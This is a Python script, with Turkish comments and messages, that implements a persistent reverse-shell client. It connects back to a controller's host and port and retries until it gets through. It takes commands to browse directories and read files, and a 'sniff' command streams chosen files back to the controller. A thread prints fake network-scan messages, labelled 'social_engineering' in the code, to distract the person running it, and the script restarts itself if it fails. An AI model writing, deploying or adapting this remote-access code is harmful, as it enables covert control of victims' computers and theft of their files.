import socket
import time
import os
import subprocess
import sys
from colorama import Fore,Back,Style,init
import threading
init()

def social_engineering():
    print("etrafdaki ağlar taranıyor\nlütfen bekleyiniz")
    time.sleep(15)
    print("etrafda bir ağ bulundu lütfen bekleyiniz.....")
    time.sleep(10)
    print("port taraması devam ediyor ip adresi(192.168.234.23)")
    time.sleep(15)
    print("açık olan \"3\" port bulundu exploit databaseleri taranıyor")
    time.sleep(30)
    print("cihaz tamamen güncel aktif exploit yok ")
    print("ağ taraması yeniden başlıyor arkaplanda bekleyebilirsiniz=====")


startup_direction=os.getcwd()
host="127.0.0.1"
port=5000


def main():
  
    print("hoşgeldin kullanıcı ağında ip4v adresleri aranıyor")
    #connection persistance
    while True:
        try:
            baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            baglantı.connect((host,port))
            break
        except:
            time.sleep(10)
    
    thread=threading.Thread(target=social_engineering)
    thread.start()

    #shell 
    while True:
        try:
            currentdizin=os.getcwd()
            emir=baglantı.recv(65536).decode("utf-8")

#==============DOSYA OKUMA,DİZİN DEĞİŞTİRME====================
            if emir.startswith("cd"):
                try:
                    dizin=emir.split()
                    dizin=dizin[1]
                    os.chdir(dizin)
                    currentdizin=os.getcwd()
                    response=f"dizin değiştirildi{currentdizin}"
                except:
                    response="bir hata oluştu"
            
            elif emir=="ls":
                try:
                    dosyalar=os.listdir(".")
                    response="\n".join(dosyalar)
                except Exception as e:
                    response=e
                    pass
            elif emir=="":
                response="boş enter"
            elif emir.startswith("cat"):
                try:
                    dosya_adi = emir.split(" ")[1] if len(emir.split(" ")) > 1 else ""
                    try:
                        with open(dosya_adi, 'r') as f:
                            icerik = f.read()
                        response = f"Dosya içeriği:\n{icerik}"
                    except Exception as e:
                        response = f"Error reading file: {e}"
                except  Exception as e:
                    print(e)
                    response=e

            elif emir=="pwd":
                pwd=os.getcwd()
                response=pwd

            elif emir=="back":
                try:
                    öncekidizin=os.path.dirname(currentdizin)
                    os.chdir(öncekidizin)
                    backdizin=os.getcwd()
                    response=f"üst dizine çıkıldı{backdizin}" 
                except:
                    response="bir  hata oluştu"

            elif emir.startswith("sniff"):
                try:
                    göndosya=emir.split(" ",1)
                    göndosya=göndosya[1] 
                    baglantı.send(f"DOSYAGELDİ {göndosya}".encode("utf-8"))
                    with open(göndosya,"rb")as tile:
                        while chunk:= tile.read(16384):
                            if not chunk:
                                break
                            baglantı.send(chunk)      
                except Exception as e:
                    response=e
                    print(e)
                baglantı.send("dosyabittiemmi".encode("utf-8"))
                print("dosya tamamen bitti")
                response="denkabey"
#==========================================================================
            else:
                response="GEÇERSİZ EMİR "

            baglantı.send(response.encode("utf-8"))

        except:
            os.chdir(startup_direction)
            time.sleep(5)
            os.execv(sys.executable, [sys.executable]+sys.argv)

if __name__=="__main__":
    main()

              

    
